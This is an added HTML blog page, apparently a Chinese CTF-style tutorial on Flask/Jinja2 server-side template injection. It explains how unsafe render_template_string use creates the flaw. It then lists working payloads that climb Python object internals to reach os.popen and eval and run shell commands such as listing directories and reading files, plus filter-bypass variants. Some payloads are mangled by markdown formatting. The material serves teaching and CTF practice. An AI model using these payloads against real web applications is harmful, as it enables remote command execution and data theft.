@@ -1,0 +1,208 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Flask-ssti模板注入 - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="ssti漏洞成因ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade  velo,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">Flask-ssti模板注入</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">Flask-ssti模板注入</h1>
+        <div class="stuff">
+            <span>五月 14, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/ssti/" rel="tag">ssti</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="ssti漏洞成因"><a href="#ssti漏洞成因" class="headerlink" title="ssti漏洞成因"></a>ssti漏洞成因</h3><p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade  velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flask模板注入进行浅析。</p>
+<h2 id="flask漏洞成因"><a href="#flask漏洞成因" class="headerlink" title="flask漏洞成因"></a>flask漏洞成因</h2><p>为什么说我们上面的代码会有漏洞呢，其实对于代码功底比较深的师傅，是不会存在ssti漏洞的，被一些偷懒的师傅简化了代码，所以造成了ssti。上面的代码我们本可以写成类似如下的形式。</p>
+<pre><code>&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;{{title}} - 小猪佩奇&lt;/title&gt;
+  &lt;/head&gt;
+ &lt;body&gt;
+      &lt;h1&gt;Hello, {{user.name}}!&lt;/h1&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>里面有两个参数需要我们渲染，user.name，以及title</p>
+<p>我们在app.py文件里进行渲染。</p>
+<pre><code>@app.route('/')
+@app.route('/index')#我们访问/或者/index都会跳转
+def index():
+   return render_template("index.html",title='Home',user=request.args.get("key"))</code></pre>
+<p>也就是说，两种代码的形式是，一种当字符串来渲染并且使用了%(request.url)，另一种规范使用index.html渲染文件。我们漏洞代码使用了render_template_string函数，而如果我们使用render_template函数，将变量传入进去，现在即使我们写成了request，我们可以在url里写自己想要的恶意代码</p>
+<pre><code>{{}}
+```
+
+主要就是这句：
+
+```
+{{"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()}}</code></pre>
+<h2 id="ctf中的一些绕过tips"><a href="#ctf中的一些绕过tips" class="headerlink" title="ctf中的一些绕过tips"></a>ctf中的一些绕过tips</h2><p>没什么系统思路。就是不断挖掘类研究官方文档以及各种能够利用的姿势。这里从最简单的绕过说起。</p>
+<p>1.过滤[]等括号</p>
+<pre><code>使用gititem绕过。如原poc {{"".**class**.**bases**[0]}}</code></pre>
+<pre><code>绕过后{{"".**class**.**bases**.**getitem**(0)}}</code></pre>
+<p>2.过滤了subclasses，拼凑法</p>
+<pre><code>原poc{{"".**class**.**bases**[0].**subclasses**()}}</code></pre>
+<pre><code>绕过 {{"".**class**.**bases**[0]['**subcla'+'sses**'](https://xz.aliyun.com/t/3679)}}</code></pre>
+<p>3.过滤class</p>
+<p>使用session</p>
+<pre><code>poc {{session['**cla'+'ss**'].**bases**[0].**bases**[0].**bases**[0].**bases**[0].**subclasses**()[118]}}</code></pre>
+<p>多个bases[0]是因为一直在向上找object类。使用mro就会很方便</p>
+<p>收藏的一些poc</p>
+<pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )
+
+object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
+
+{{request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')}}</code></pre>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png" alt="img"></a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssti%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">1.</span> <span class="toc-text">ssti漏洞成因</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flask%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number"></span> <span class="toc-text">flask漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctf%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87tips"><span class="toc-number"></span> <span class="toc-text">ctf中的一些绕过tips</span></a>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
